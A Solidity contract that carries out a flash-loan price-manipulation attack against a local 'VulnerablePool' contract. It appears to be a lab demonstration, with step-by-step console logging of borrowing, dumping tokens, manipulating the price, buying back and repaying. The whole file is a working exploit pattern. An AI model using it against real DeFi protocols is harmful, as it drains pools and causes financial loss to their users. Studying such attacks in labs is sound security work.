// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./FlashLoanProvider.sol";
import "./VulnerablePool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "forge-std/console.sol";

contract FlashLoanAttacker is IFlashLoanReceiver {
    FlashLoanProvider public flashLoanProvider;
    VulnerablePool public pool;
    IERC20 public token;
    address public owner;
    
    constructor(address _flashLoanProvider, address payable _pool, address _token) {
        flashLoanProvider = FlashLoanProvider(_flashLoanProvider);
        pool = VulnerablePool(_pool);
        token = IERC20(_token);
        owner = msg.sender;
    }
    
    function attack(uint256 loanAmount) external payable {
        require(msg.sender == owner, "Only owner");
        console.log("[1] Starting attack with loan amount:", loanAmount);
        flashLoanProvider.flashLoan(loanAmount, "");
    }
    
    function executeOperation(uint256 amount, uint256 fee, bytes calldata) external override {        
        console.log("[2] Received flash loan:", amount);
        console.log("    Price before:", pool.getPrice());
        
        token.approve(address(pool), amount);
        pool.sellTokens(amount);
        
        console.log("[3] Sold tokens, received ETH");
        console.log("    Attacker ETH balance:", address(this).balance);
        
        pool.updatePrice();
        uint256 newPrice = pool.getPrice();
        console.log("[4] Price manipulated to:", newPrice);
        
        uint256 ethToSpend = address(this).balance / 2;
        console.log("[5] Buying tokens with", ethToSpend, "ETH");
        pool.buyTokens{value: ethToSpend}();
        
        uint256 tokensGained = token.balanceOf(address(this));
        console.log("[6] Tokens gained:", tokensGained);
        
        uint256 repayAmount = amount + fee;
        console.log("[7] Repaying flash loan:", repayAmount);
        require(token.transfer(address(flashLoanProvider), repayAmount), "Repay failed");
        
        uint256 finalTokens = token.balanceOf(address(this));
        console.log("[8] Final tokens after repay:", finalTokens);
    }
    
    function withdraw() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
        token.transfer(owner, token.balanceOf(address(this)));
    }
    
    receive() external payable {}
}
